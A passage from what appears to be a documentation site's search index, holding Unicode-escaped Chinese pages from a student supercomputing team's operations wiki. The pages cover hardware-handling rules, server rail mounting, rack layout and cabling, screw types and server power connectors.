\u7684\u590d\u6742\u6027\u548c\u5b66\u4e60\u6210\u672c\u8fdc\u8fdc\u8d85\u8fc7\u4e86\u6211\u4eec\u7684\u9700\u6c42\u3002</p> <p>\u7b14\u8005\u4e0e AAA \u6218\u961f\u7684\u540c\u5b66\u804a\u5929\u65f6\u4e86\u89e3\u5230\u4ed6\u4eec\u7684\u8fd0\u7ef4\u8da3\u4e8b\u3002\u4ed6\u4eec\u961f\u91cc\u6709\u4e00\u4f4d\u201c\u4f20\u5947\u8fd0\u7ef4\u201d\uff0c\u7ed9\u673a\u5b50\u90e8\u7f72\u4e86 K8S\uff0c\u7ed3\u679c\u5347\u7ea7\u4e0d\u505a\u5907\u4efd\u4e0d\u770b\u6587\u6863\uff0c\u4e22\u4e86\u67d0\u5c4a\u6821\u8d5b\u6240\u6709\u9898\u76ee\u7684\u9644\u4ef6\uff0c\u6700\u7ec8\u4e5f\u6ca1\u6709\u627e\u56de\u6765\u3002\u8fd9\u662f\u4e00\u4e2a\u5f88\u597d\u7684\u53cd\u9762\u6559\u6750\uff0c\u8bf4\u660e\u4e86 K8S \u7684\u590d\u6742\u6027\u548c\u5b66\u4e60\u6210\u672c\u3002</p> <p>\u5317\u5927 HPCGAME 2025 \u4f7f\u7528 K8S \u4f5c\u4e3a\u57fa\u7840\u67b6\u6784\uff0c\u7ed3\u679c\u8fd0\u7ef4\u56f0\u96be\u3002\u4ed6\u4eec\u7684\u7ed3\u8bba\u662f\uff1a</p> <p>Distributed OS? No way! Do your shared memory research first!</p> </li> <li> <p>\u907f\u514d\u91cd\u590d\u9020\u8f6e\u5b50</p> <p>\u4f5c\u4e3a\u5b66\u751f\uff0c\u6211\u4eec\u6ca1\u6709\u5f88\u591a\u65f6\u95f4\u7cbe\u529b\u6295\u5165\u5230\u8fd0\u7ef4\u5de5\u4f5c\u4e2d\u3002\u5728\u8fd0\u7ef4\u65b9\u9762\u6709\u5927\u91cf\u5de5\u4e1a\u754c\u751f\u4ea7\u7684\u8f6e\u5b50\uff0c\u6211\u4eec\u5e94\u5f53\u5c3d\u53ef\u80fd\u5229\u7528\u5df2\u6709\u7684\u8f6e\u5b50\u3002\u81ea\u5df1\u751f\u4ea7\u7684\u8f6e\u5b50\u6700\u540e\u53ef\u80fd\u8d28\u91cf\u582a\u5fe7\u4e14\u96be\u4ee5\u6301\u7eed\u7ef4\u62a4\u3002</p> <p>\u8fd9\u91cc\u6709\u4e00\u4e2a\u4f8b\u5916\uff0c\u5c31\u662f\u504f\u7cfb\u7edf\u67b6\u6784\u5e95\u5c42\u7684\u4e1c\u897f\uff08\u6bd4\u5982\u7cfb\u7edf\u7ba1\u7406\u548c\u90e8\u7f72\u5de5\u5177\uff09\u5f80\u5f80\u90fd\u5fc5\u987b\u9020\u8f6e\u5b50\uff0c\u56e0\u4e3a\u5dee\u5f02\u592a\u5927\u4e86\uff0c\u6ca1\u6709\u4e00\u4e2a\u901a\u7528\u7684\u65b9\u6848\u3002\u6b64\u5916\uff0c\u5982\u679c\u9700\u8981\u5b9e\u73b0\u7684\u529f\u80fd\u6bd4\u8f83\u7b80\u5355\uff0c\u81ea\u5df1\u9020\u8f6e\u5b50\u7ec3\u7ec3\u624b\u4e5f\u672a\u5c1d\u4e0d\u53ef\u3002</p> </li> </ol>","tags":["\u5b8c\u5584"]},{"location":"operation/#\u8fd0\u7ef4\u8fdb\u5c55","title":"\u8fd0\u7ef4\u8fdb\u5c55","text":"<p>\u8d85\u7b97\u961f\u8fd0\u7ef4\u4f53\u7cfb\u4ece 2024 \u5e74\u5f00\u59cb\u9010\u6b65\u5efa\u7acb\u3002\u7b2c\u4e00\u5e74\u6211\u4eec\u5b8c\u6210\u4e86\u57fa\u7840\u8bbe\u65bd\u7684\u6539\u9020\uff0c\u5305\u62ec\u673a\u623f\u3001\u7f51\u7edc\u3001\u7cfb\u7edf\u7b49\u65b9\u9762\u7684\u6539\u8fdb\u3002\u7b2c\u4e8c\u5e74\u6211\u4eec\u5c06\u8fdb\u4e00\u6b65\u5b8c\u5584\u8fd0\u7ef4\u4f53\u7cfb\uff0c\u5305\u62ec\u5efa\u7acb\u66f4\u591a\u7684\u76d1\u63a7\u3001\u65e5\u5fd7\u3001\u81ea\u52a8\u5316\u7b49\u7cfb\u7edf\uff0c\u63d0\u9ad8\u8fd0\u7ef4\u6548\u7387\u548c\u7a33\u5b9a\u6027\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/hardware/","title":"\u786c\u4ef6\u8fd0\u7ef4","text":"","tags":["\u5b8c\u5584"]},{"location":"operation/hardware/#\u786c\u4ef6\u8fd0\u7ef4","title":"\u786c\u4ef6\u8fd0\u7ef4","text":"<p>Abstract</p> <p>\u672c\u6587\u6863\u4e3b\u8981\u4ecb\u7ecd\u786c\u4ef6\u8fd0\u7ef4\u7684\u6ce8\u610f\u4e8b\u9879\u548c\u64cd\u4f5c\u89c4\u8303\u3002\u786c\u4ef6\u77e5\u8bc6\u548c\u8bbe\u5907\u8bf4\u660e\u4e66\u89c1\u5176\u4ed6\u6587\u6863\u3002</p> <p>\u76ee\u524d\uff0c\u96c6\u7fa4\u673a\u623f\u57fa\u7840\u8bbe\u65bd\u57fa\u672c\u7a33\u5b9a\uff0c\u5927\u90e8\u5206\u8fd0\u7ef4\u4efb\u52a1\u5df2\u7ecf\u53ef\u4ee5\u901a\u8fc7\u8fdc\u7a0b\u65b9\u5f0f\u5b8c\u6210\u3002\u4f46\u6211\u4eec\u4ecd\u7136\u9700\u8981\u5177\u5907\u57fa\u7840\u7684\u786c\u4ef6\u77e5\u8bc6\uff0c\u5e76\u5177\u5907\u52a8\u624b\u64cd\u4f5c\u7684\u80fd\u529b\uff1a</p> <ul> <li>\u6bcf\u6708\u4f1a\u6709\u4e00\u4e24\u6b21\u66f4\u6362\u8bbe\u5907\u7684\u9700\u6c42</li> <li>\u6253\u6bd4\u8d5b\u65f6\u9700\u8981\u81ea\u5df1\u7ec4\u88c5\u96c6\u7fa4</li> </ul> <p>\u786c\u4ef6\u8fd0\u7ef4\u9700\u8981\u4ed4\u7ec6\u8010\u5fc3\uff0c\u7279\u522b\u8981\u6ce8\u610f\u907f\u514d\u786c\u4ef6\u635f\u574f\u3002\u8bf7\u7231\u60dc\u8bbe\u5907\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/hardware/#\u6ce8\u610f\u4e8b\u9879","title":"\u6ce8\u610f\u4e8b\u9879","text":"<p>\u5728\u8fdb\u884c\u786c\u4ef6\u64cd\u4f5c\u65f6\uff0c\u8bf7\u52a1\u5fc5\u9075\u5faa\u4ee5\u4e0b\u5b88\u5219\uff01</p> <p>\u8fd9\u4e9b\u6ce8\u610f\u4e8b\u9879\u90fd\u662f\u6211\u4eec\u5728\u8fd0\u7ef4\u8fc7\u7a0b\u4e2d\u5403\u8fc7\u7684\u82e6\uff0c\u8bf7\u4e0d\u8981\u6389\u4ee5\u8f7b\u5fc3\uff01</p> <ul> <li>\u4f69\u6234\u624b\u5957<ul> <li>\uff08\u66b4\u8bba\uff09\u4e0d\u6234\u624b\u5957\u7684\u4eba\u90fd\u662f\u6ca1\u88ab\u5939\u8fc7\u6216\u7535\u8fc7\u7684\u3002\u8fdb\u5165\u673a\u623f\u524d\u8bf7\u5148\u4f69\u6234\u624b\u5957\uff08\u5c24\u5176\u662f\u79cb\u51ac\u5b63\u8282\uff0c\u6ce8\u610f\u9759\u7535\u5371\u5bb3\uff01\uff09\u3002</li> <li>\u65e2\u80fd\u4fdd\u62a4\u81ea\u5df1\u7684\u624b\u4e0d\u88ab\u673a\u6cb9\u3001\u7070\u5c18\u5f04\u810f\u6216\u88ab\u5668\u4ef6\u5f04\u4f24\uff0c\u4e5f\u80fd\u4fdd\u62a4\u786c\u4ef6\u8bbe\u5907\u514d\u53d7\u4fb5\u8680\u548c\u9759\u7535\u7684\u5371\u9669\u3002</li> <li>\u4f8b\u5916\uff1a\u62c6\u5378 CPU \u65f6\u4e0d\u5e94\u5f53\u4f69\u6234\u624b\u5957\uff0c\u907f\u514d\u635f\u574f\u63d2\u69fd\u4e0a\u7684\u89e6\u70b9\u3002</li> </ul> </li> <li> <p>\u5207\u52ff\u968f\u610f\u4e71\u4e22\u96f6\u4ef6</p> <ul> <li>\u6240\u6709\u7269\u8d44\u8bf7\u7528\u5b8c\u653e\u56de\u539f\u4f4d\uff0c\u5426\u5219\u53c8\u4f1a\u53d8\u5f97\u975e\u5e38\u4e71\u3002</li> <li>\u53bb\u673a\u623f\u4e4b\u524d\u5e26\u4e0a\u96f6\u4ef6\u76d2\u3002\u87ba\u4e1d\u7b49\u5404\u79cd\u5c0f\u96f6\u4ef6\u9700\u8981\u7684\u65f6\u5019\u6781\u5176\u96be\u627e\u3002</li> <li>\u62c6\u5378\u96f6\u4ef6\u65f6\u52a1\u5fc5\u653e\u7f6e\u5230\u96f6\u4ef6\u76d2\u4e2d\uff0c\u6216\u7528\u5bc6\u5c01\u888b\u88c5\u597d\u5e76\u6807\u8bb0\uff0c\u907f\u514d\u65e5\u540e\u4e22\u5931\u6216\u6df7\u6dc6\u3002</li> </ul> <p></p>      \u4ece\u670d\u52a1\u5668\u4e0a\u62c6\u5378\u7ebf\u7f06\u540e\u7528\u6807\u7b7e\u6807\u8bb0\u597d      <p></p> </li> <li> <p>\u62cd\u7167\u8bb0\u5f55</p> <ul> <li>\u5982\u679c\u4f60\u5bf9\u5c06\u8981\u64cd\u4f5c\u7684\u5185\u5bb9\u4e0d\u719f\u6089\uff0c\u8bf7\u62cd\u7167\u8bb0\u5f55\u539f\u59cb\u72b6\u6001\uff0c\u4ee5\u4fbf\u5728\u64cd\u4f5c\u5931\u8d25\u65f6\u80fd\u591f\u6062\u590d\u3002</li> <li>\u5bf9\u4e8e\u7ebf\u7f06\u8f83\u591a\u7684\u60c5\u51b5\u8fd9\u4e00\u70b9\u5c24\u5176\u91cd\u8981\uff01\u4e0d\u8981\u8fc7\u4e8e\u81ea\u4fe1\u76f8\u4fe1\u89c9\u5f97\u4e00\u5b9a\u80fd\u590d\u539f\u3002</li> </ul> </li> <li> <p>\u52ff\u7528\u86ee\u529b</p> <ul> <li>\u673a\u623f\u5185\u964c\u751f\u7684\u63a5\u53e3\u548c\u7ec4\u4ef6\u8f83\u591a\uff0c\u5b83\u4eec\u5f80\u5f80\u6709\u7279\u5b9a\u7684\u63d2\u62d4\u65b9\u5f0f\uff0c\u4e0d\u5f53\u64cd\u4f5c\u53ef\u80fd\u5bfc\u81f4\u786c\u4ef6\u635f\u574f\u3002</li> <li> <p>\u7528\u86ee\u529b\u7684\u7ed3\u679c belike\uff1a</p> <p></p>      \u7528\u86ee\u529b\u5bfc\u81f4 PCIe \u8bbe\u5907\u6302\u8033\u635f\u574f\u65e0\u6cd5\u5b89\u88c5      <p></p> </li> </ul> </li> <li> <p>\u63d2\u597d\u7ebf\u4e4b\u540e\uff0c\u8f7b\u8f7b\u62c9\u4e00\u4e0b\u770b\u770b\u6709\u6ca1\u6709\u63d2\u7262</p> <ul> <li>\u6709\u4e9b\u7f51\u7ebf\u5f88\u5bb9\u6613\u8131\u843d\uff0cIB \u7ebf\u4e5f\u53ef\u80fd\u63d2\u53cd\u3002</li> <li> <p>\u6709\u4e9b\u7535\u6e90\u7ebf\u63a5\u53e3\u4e5f\u4f1a\u6709\u677e\u52a8\uff1a</p> <p></p>      \u7535\u6e90\u7ebf\u63a5\u53e3\u677e\u52a8      <p></p> </li> <li> <p>PCIE \u5361\u3001\u7f51\u7edc\u3001\u7535\u6e90\u7ebf\u63a5\u53e3\u90fd\u6709\u6307\u793a\u706f\uff0c\u5de1\u68c0\u65f6\u53ef\u4ee5\u591a\u7559\u5fc3\u4e00\u4e0b\u6307\u793a\u706f\u7684\u72b6\u6001\u3002</p> </li> </ul> </li> <li> <p>\u8d70\u7ebf</p> <ul> <li>\u53c2\u8003 \u64cd\u4f5c\u624b\u518c#\u673a\u67dc\u5e03\u5c40\u4e0e\u7406\u7ebf\uff0c\u7981\u6b62\u4e71\u98de\u3002</li> <li>\u975e\u6211\u4eec\u7ba1\u7406\u7684\u673a\u67dc\u7ebf\u7f06\u53ef\u80fd\u5f88\u4e71\uff0c\u53ea\u8981\u6ca1\u5f71\u54cd\u5230\u6211\u4eec\u5c31\u6ca1\u4e8b\u3002\u5982\u679c\u4ed6\u4eec\u98de\u7ebf\u7ecf\u8fc7\u6211\u4eec\uff0c\u5c31\u6254\u5230\u673a\u67dc\u9876\u4e0a\u53bb\u3002</li> </ul> </li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/hardware/#\u64cd\u4f5c\u89c4\u8303","title":"\u64cd\u4f5c\u89c4\u8303","text":"","tags":["\u5b8c\u5584"]},{"location":"operation/hardware/#\u670d\u52a1\u5668\u4e0a\u4e0b\u67b6","title":"\u670d\u52a1\u5668\u4e0a/\u4e0b\u67b6","text":"<p>\u670d\u52a1\u5668\u9644\u4ef6\u76d2\u5185\u4e00\u822c\u6709\u4e0a\u67b6\u8bf4\u660e\u4e66\uff0c\u6309\u7167\u8bf4\u660e\u4e66\u64cd\u4f5c\u3002</p> <p>\u670d\u52a1\u5668\u7684\u5bfc\u8f68\u6709\u51e0\u79cd\u7c7b\u578b\uff1a</p> <ul> <li>\u6258\u67b6\u5f0f\u5bfc\u8f68\uff1a\u6211\u4eec\u4e00\u822c\u4e0d\u4f7f\u7528\u3002</li> <li> <p>\u62bd\u62c9\u5f0f\u5bfc\u8f68\uff1a</p> <ul> <li> <p>\u5bfc\u8f68\u662f\u5206\u6bb5\u7684\uff0c\u62bd\u51fa\u5185\u8f68\u540e\u5361\u6263\u4f1a\u81ea\u52a8\u9501\u4f4f\u3002\u6839\u636e\u5361\u6263\u7684\u6784\u9020\u4e0d\u540c\uff0c\u9700\u8981\u6309\u538b/\u62c9\u52a8\u5361\u6263\u624d\u80fd\u5c06\u5185\u8f68\u63a8\u56de\u3002</p> <p></p>      \u62bd\u62c9\u5f0f\u5bfc\u8f68\u7684\u5185\u8f68\u5361\u6263      <p></p> </li> </ul> <p>\u6839\u636e\u5185\u8f68\u662f\u5426\u53ef\u62c6\u5378\uff0c\u5206\u4e3a\u4e24\u79cd\u60c5\u51b5\uff1a</p> <ul> <li> <p>\u5185\u8f68\u53ef\u62c6\u5378\uff1a\u5148\u5378\u4e0b\u5185\u8f68\u5b89\u88c5\u5230\u670d\u52a1\u5668\u3002\u7136\u540e\u5c06\u670d\u52a1\u5668\u4e0e\u5185\u8f68\u4e00\u8d77\u63a8\u5165\u5916\u8f68\u3002\u53c2\u8003  Dell PowerEdge R740 \u670d\u52a1\u5668\u5378\u8f7d/\u5b89\u88c5\u6df7\u5408\u5bfc\u8f68\u3002</p> <p></p>      \u5c06\u5185\u8f68\u5b89\u88c5\u5230\u670d\u52a1\u5668           \u5c06\u670d\u52a1\u5668\u4e0e\u5185\u8f68\u4e00\u8d77\u63a8\u5165\u5916\u8f68      <p></p> </li> <li> <p>\u5185\u8f68\u4e0d\u53ef\u62c6\u5378\uff1a\u62ac\u8d77\u670d\u52a1\u5668\uff0c\u5c06\u94c6\u9489\u76f4\u63a5\u5361\u5728\u5185\u8f68\u5361\u69fd\u4e2d\u3002\u53c2\u8003  \u6d6a\u6f6e\u82f1\u4fe1\u670d\u52a1\u5668 NF5270M6 \u6574\u673a\u4e0a\u67b6\u5b89\u88c5\u89c6\u9891\u3002</p> <p></p>      \u5c06\u94c6\u9489\u5361\u5728\u5185\u8f68\u5361\u69fd\u4e2d      <p></p> </li> </ul> </li> </ul> <p>\u9519\u8bef\u6848\u4f8b</p> <p>\u66fe\u7ecf\u6709\u6ca1\u7ecf\u9a8c\u7684\u540c\u5b66\u6765\u673a\u623f\u4e0a\u67b6\u670d\u52a1\u5668\uff0c\u7528\u5bfc\u8f68\u6302\u94a9\u6765\u627f\u91cd\u3002\u8fd9\u662f\u4e25\u91cd\u9519\u8bef\u7684\uff0c\u5f88\u5bb9\u6613\u5bfc\u81f4\u6302\u94a9\u65ad\u88c2\u670d\u52a1\u5668\u6389\u843d\u3002</p> <p></p> <p></p> <p>\u6700\u597d\u4e0d\u8981\u8ba9\u6ca1\u7ecf\u9a8c\u7684\u4eba\u4e0a\u67b6\u670d\u52a1\u5668\uff0c\u8054\u7edc\u65f6\u4e00\u5b9a\u8981\u8bf4\u6e05\u695a\u5404\u9879\u6ce8\u610f\u4e8b\u9879\uff0c\u628a\u6559\u7a0b\u53d1\u7ed9\u4ed6\u4eec\u3002</p> <ul> <li>\u8bb0\u5f97\u56fa\u5b9a\u597d\u5bfc\u8f68\u4e0e\u670d\u52a1\u5668\u3001\u5bfc\u8f68\u4e0e\u673a\u67b6\u7684\u87ba\u4e1d\uff08\u5982\u679c\u6709\uff09\uff0c\u907f\u514d\u62bd\u62c9\u65f6\u5bfc\u8f68\u8131\u67b6\u3002</li> </ul>      \u670d\u52a1\u5668\u4e0a\u67b6\u8fc7\u7a0b","tags":["\u5b8c\u5584"]},{"location":"operation/hardware/#\u673a\u67dc\u5e03\u5c40\u4e0e\u7406\u7ebf","title":"\u673a\u67dc\u5e03\u5c40\u4e0e\u7406\u7ebf","text":"<p>\u6211\u4eec\u7684\u673a\u67dc\u5e03\u5c40\u7ea6\u5b9a\uff1a</p> <ul> <li>\u673a\u67dc\u9876\u90e8\u4e3a TOR\uff08Top of Rack\uff09\u4ea4\u6362\u673a\u3001InfiniBand \u4ea4\u6362\u673a\u7b49\u7f51\u7edc\u8bbe\u5907\u3002</li> <li>\u673a\u67dc\u5e95\u90e8\u4e3a\u670d\u52a1\u5668\uff0cU \u6570\u8d8a\u5927\u3001\u8d8a\u91cd\u7684\u8bbe\u5907\u5e94\u5f53\u8d8a\u9760\u8fd1\u5e95\u90e8\u3002</li> <li>\u4e3a\u4e86\u65b9\u4fbf\u7ef4\u62a4\uff0c\u6bcf\u53f0\u670d\u52a1\u5668\u4e4b\u95f4\u81f3\u5c11\u4fdd\u6301 1U \u7684\u95f4\u9694\uff0c\u666e\u901a\u670d\u52a1\u5668\u4e0a\u67b6\u9ad8\u5ea6\u4e0d\u8d85\u8fc7 30U\u3002\u8fd9\u610f\u5473\u7740\u4e00\u4e2a\u673a\u67dc\u53ef\u4ee5\u627f\u8f7d\u7ea6 10 \u53f0 2U \u670d\u52a1\u5668\u3002</li> </ul> <p>\u4e00\u822c\u7684\u7406\u7ebf\u65b9\u5f0f\u662f\u5229\u7528\u673a\u67dc\u4fa7\u8fb9\u7684\u7406\u7ebf\u69fd\uff0c\u5c06\u7ebf\u7f06\u68b3\u7406\u81f3\u673a\u67dc\u4e24\u4fa7\u3002</p>  \u673a\u67dc\u7406\u7ebf\u69fd  <p>\u6211\u4eec\u7684\u673a\u67dc\u6ca1\u6709\u9884\u88c5\u7406\u7ebf\u69fd\uff0c\u4e14\u6709\u4e9b\u4f4d\u7f6e\u88ab PDU \u5360\u7528\uff0c\u6240\u4ee5\u5728\u673a\u67b6\u4e0a\u5b89\u88c5\u7406\u7ebf\u73af\uff0c\u7528\u4e8e\u6e05\u7406\u7f51\u7ebf\u3002</p> <ul> <li> <p>\u4ece\u6700\u9876\u4e0a\u7684\u4ea4\u6362\u673a\u5f00\u59cb\uff0c\u5de6\u4fa7\u662f\u6570\u636e\u7f51\u7edc\uff0c\u53f3\u4fa7\u662f\u7ba1\u7406\u7f51\u7edc\u3002</p> <p></p>      \u5de6\u6570\u636e\uff0c\u53f3\u7ba1\u7406      <p></p> </li> <li> <p>\u7f51\u7ebf\uff1a\u4f7f\u7528\u7406\u7ebf\u69fd\u68b3\u7406\u3002\u8fc7\u957f\u7684\u7ebf\u88c1\u526a\u6253\u6c34\u6676\u5934\uff0c\u6216\u6298\u53e0\u540e\u4f7f\u7528\u624e\u5e26\u7ed1\u597d\u3002</p> </li> <li>\u7535\u6e90\u7ebf\uff1a\u7535\u6e90\u7ebf\u4e0d\u8d70\u7406\u7ebf\u69fd\u3002\u6298\u53e0\u540e\u4f7f\u7528\u7c97\u624e\u5e26\u7ed1\u597d\u3002\u7535\u6e90\u5728 PDU \u4e0a\u7684\u987a\u5e8f\u4e0e\u5728\u673a\u67b6\u4e0a\u7684\u987a\u5e8f\u5e94\u5f53\u4e00\u81f4\u3002</li> </ul> <p>\u6709\u4e9b\u670d\u52a1\u5668\u5e26\u6709\u7406\u7ebf\u81c2\uff0c\u53ef\u4ee5\u5728\u4e0d\u62c6\u5378\u7ebf\u7f06\u7684\u540c\u65f6\u62bd\u51fa\u670d\u52a1\u5668\u8fdb\u884c\u68c0\u67e5\u3002</p>      \u7406\u7ebf\u81c2      <p>\u4f46\u6211\u4eec\u6ca1\u6709\uff0c\u4e5f\u4e0d\u9884\u7559\u957f\u5ea6\uff0c\u7ebf\u90fd\u624e\u5f97\u6bd4\u8f83\u7d27\uff0c\u6240\u4ee5\u62bd\u51fa\u670d\u52a1\u5668\u524d\u5fc5\u987b\u68c0\u67e5\u6240\u6709\u7ebf\u7f06\u90fd\u5df2\u7ecf\u5378\u9664\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/hardware/knowledge/","title":"\u786c\u4ef6\u77e5\u8bc6","text":"","tags":["\u5b8c\u5584"]},{"location":"operation/hardware/knowledge/#\u786c\u4ef6\u77e5\u8bc6","title":"\u786c\u4ef6\u77e5\u8bc6","text":"<p>Abstract</p> <p>\u672c\u6587\u6863\u4ecb\u7ecd\u5404\u79cd\u5404\u6837\u7684\u786c\u4ef6\u77e5\u8bc6\uff0c\u4ece\u87ba\u4e1d\u5230\u7ebf\u7f06\u5230\u8bbe\u5907\u63a5\u53e3\u3002</p> <p>\u5982\u679c\u4f60\u89c9\u5f97\u6709\u9700\u8981\u8865\u5145\u7684\u786c\u4ef6\u77e5\u8bc6\uff0c\u6b22\u8fce\u52a8\u624b\u7f16\u8f91\u672c\u6587\u6863\uff01</p>","tags":["\u5b8c\u5584"]},{"location":"operation/hardware/knowledge/#\u87ba\u4e1d","title":"\u87ba\u4e1d","text":"<p>Quote</p> <ul> <li>\u5176\u4ed6\u201c\u786c\u4ef6\u201d\u88c5\u673a\u51b7\u77e5\u8bc6\u4e4b\u87ba\u4e1d\u4e0e\u87ba\u4e1d\u5200 - NGA</li> <li>Computer case screws - Wikipedia</li> </ul> <p>\u7ecf\u9a8c\u4e4b\u8c08</p> <p>\u87ba\u4e1d\u975e\u5e38\u5bb9\u6613\u4e71\u4e22\uff01\u5982\u679c\u4ece\u54ea\u91cc\u62c6\u4e0b\u87ba\u4e1d\uff0c\u8bf7\u8bb0\u5f97\u7528\u5bc6\u5c01\u888b\u88c5\u597d\u8d34\u4e0a\u6807\u7b7e\uff01</p> <ul> <li>\u673a\u67dc\u87ba\u4e1d\uff1a\u5e38\u89c1 M5 \u548c M6 \u578b\u53f7\uff0c\u6570\u5b57\u5c31\u662f\u76f4\u5f84\u4e3a\u51e0\u6beb\u7c73\u3002\u4e00\u822c\u7528\u4e8e\u56fa\u5b9a\u670d\u52a1\u5668\u673a\u67b6\u3001\u6302\u8033\u7b49\u3002\u8fd9\u79cd\u87ba\u6bcd\u53ef\u4ee5\u56fa\u5b9a\u5728\u673a\u67b6\u4e0a\u3002\u65b9\u4fbf\u65cb\u52a8\u3002</li> </ul>  \u673a\u67dc\u87ba\u4e1d  <ul> <li> <p>\u673a\u7bb1\u87ba\u4e1d\uff1a\u4e0b\u9762\u90fd\u662f\u4e00\u822c\u60c5\u51b5\u3002\u603b\u4e4b\u7528\u539f\u914d\u7684\u87ba\u4e1d\u6700\u597d\uff0c\u6240\u4ee5\u4e00\u5b9a\u8981\u6807\u8bb0\u6e05\u695a\uff01</p> <ul> <li>\u673a\u7bb1\u4e2d\u6700\u5e38\u89c1\u7684\u87ba\u4e1d\u662f M3\uff08\u516c\u5236\uff09\u548c 6#32\uff08\u7f8e\u5236\uff09\u3002<ul> <li>\u8fd9\u4e24\u8005\u76f4\u5f84\u76f8\u5dee\u4e0d\u5927\uff0c\u4f46\u87ba\u7eb9\u95f4\u8ddd\uff08\u7259\u8ddd\uff09\u4e0d\u540c\uff0c\u6781\u5176\u5bb9\u6613\u7528\u9519\u5bfc\u81f4\u87ba\u7eb9\u6ed1\u4e1d\u3002</li> <li>\u524d\u8005\u7684\u87ba\u7eb9\u66f4\u7ec6\u5bc6\uff0c\u540e\u8005\u66f4\u677e\u66f4\u7c97\uff0c\u5176\u5b9e\u662f\u6bd4\u8f83\u5bb9\u6613\u5206\u8fa8\u7684\u3002</li> <li>\u4e00\u822c\u524d\u8005\u7528\u4e8e 2.5 \u5bf8\u56fa\u6001\u786c\u76d8\uff0c\u540e\u8005\u7528\u4e8e 3.5 \u5bf8\u673a\u68b0\u786c\u76d8\u3001PCIe \u63d2\u69fd\u56fa\u5b9a\u3002</li> </ul> </li> </ul> <p></p>      \u8fd0\u7ef4\u65f6\u628a\u87ba\u4e1d\u5206\u7c7b\u653e\u597d           M3 \u4e0e 6#32 \u87ba\u4e1d      <p></p> <ul> <li>\u603b\u4e4b\uff0c\u87ba\u4e1d\u4e0d\u8981\u786c\u62e7\uff0c\u611f\u89c9\u4e0d\u5bf9\u5c31\u505c\u4e0b\u6765\u6362\u87ba\u4e1d\uff0c\u5426\u5219\u87ba\u5b54\u53ef\u80fd\u5c31\u5e9f\u4e86\u3002</li> </ul> </li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/hardware/knowledge/#\u7535\u6e90\u7ebf\u7f06","title":"\u7535\u6e90\u7ebf\u7f06","text":"<p>Quote</p> <ul> <li>How Much Do You Know About Power Cord Types? - FS</li> </ul> <ul> <li>\u56fd\u6807\u7535\u6e90\u63d2\u5934\u6709 10A \u548c 16A \u4e4b\u5206\uff0c\u5176\u4e2d 16A \u63d2\u5934\u7565\u5927\u3002\u8fd9\u4e24\u79cd\u63d2\u5934\u63d2\u5ea7\u4e0d\u901a\u7528\u3002</li> <li>\u57fa\u7840\u8d1f\u8f7d\uff1a10A \u63d2\u5ea7\u8d1f\u8f7d\u529f\u7387=220V\u00d710A=2200W\uff1b16A \u63d2\u5ea7\u8d1f\u8f7d\u529f\u7387=220V\u00d716A=3520W\u3002</li> </ul>      \u63d2\u5934      <ul> <li>\u670d\u52a1\u5668\u7535\u6e90\u63d2\u5b54\u6709 C13 \u548c C19 \u4e4b\u5206\uff0c\u5b83\u4eec\u7684\u6700\u5927\u7535\u6d41\u6709\u533a\u522b\u3002C13 \u4e00\u822c\u5bf9\u5e94 10A \u63d2\u5934\uff0cC19 \u5bf9\u5e94 16A \u63d2\u5934</li> </ul>  \u7535\u6e90\u63d2\u5b54  <ul> <li>PDU \u4e0a\u5e38\u89c1\u7684\u7ec4\u4ef6\u5982\u4e0b\uff1a<ul> <li>10/16A \u8fc7\u8f7d\u4fdd\u62a4\u5668\uff1a\u673a\u67dc\u4e0a\u7684\u5c0f PDU \u6709\uff0c\u8fc7\u8f7d\u4f1a\u8df3\u8d77\u6765\uff0c\u6309\u4e0b\u53bb\u6062\u590d\u6b63\u5e38\u3002</li> </ul> </li> </ul> <p>\u7ecf\u9a8c\u4e4b\u8c08</p> <p>PDU \u4e0d\u8db3\u65f6\u6211\u4eec\u66fe\u7ecf\u5c06\u4e24\u53f0\u5927\u529f\u7387\u670d\u52a1\u5668\u63a5\u5230 10A \u5c0f PDU \u4e0a\uff0c\u5bfc\u81f4 PDU \u8fc7\u8f7d\u4fdd\u62a4\u5668\u8df3\u95f8\u3002\u5e94\u5f53\u6ce8\u610f\u8ba1\u7b97 PDU \u7684\u989d\u5b9a\u529f\u7387\uff0c\u4e0d\u8981\u8d85\u8f7d\u3002</p>  PDU \u7ec4\u4ef6","tags":["\u5b8c\u5584"]},{"location":"operation/hardware/knowledge/#\u7f51\u7edc\u786c\u4ef6","title":"\u7f51\u7edc\u786c\u4ef6","text":"<p>\u5149\u6a21\u5757\u3001\u7f51\u7edc\u7ebf\u7f06\u3001\u7f51\u7edc\u8bbe\u5907\u7b49\u786c\u4ef6\u4ecb\u7ecd\u89c1 \u8ba4\u8bc6\u6570\u636e\u4e2d\u5fc3\u7f51\u7edc#\u8ba4\u8bc6\u786c\u4ef6\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/hardware/knowledge/#\u5916\u56f4\u8bbe\u5907\u53ca\u5176\u63a5\u53e3","title":"\u5916\u56f4\u8bbe\u5907\u53ca\u5176\u63a5\u53e3","text":"<p>Quote</p> <ul> <li>SAS/ SATA Cables Guide \u2013 SFF-8087, 8088, 8470, 8482, 8484, and single device connectors</li> <li>\u3010\u786c\u6838\u79d1\u666e\u3011\u786c\u76d8\u7684 SATA M.2 NGFF NVME \u662f\u4ec0\u4e48\u610f\u601d\uff0c\u8be6\u89e3\u786c\u76d8\u7684\u603b\u7ebf\u534f\u8bae\u4e0e\u63a5\u53e3 - \u786c\u4ef6\u8336\u8c08</li> </ul> <p>\u672c\u8282\u4e3b\u8981\u63cf\u8ff0\u7684\u662f\u5b58\u50a8\u8bbe\u5907\uff0c\u4f46\u8fd9\u4e9b\u6982\u5ff5\u57fa\u672c\u9002\u7528\u4e8e\u5404\u79cd\u5916\u56f4\u8bbe\u5907\u3002\u5b58\u50a8\u8bbe\u5907\u7684\u8fde\u63a5\u5212\u5206\u4e3a\u534f\u8bae\u3001\u603b\u7ebf\u4e0e\u63a5\u53e3\u4e09\u4e2a\u5c42\u6b21\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a</p>      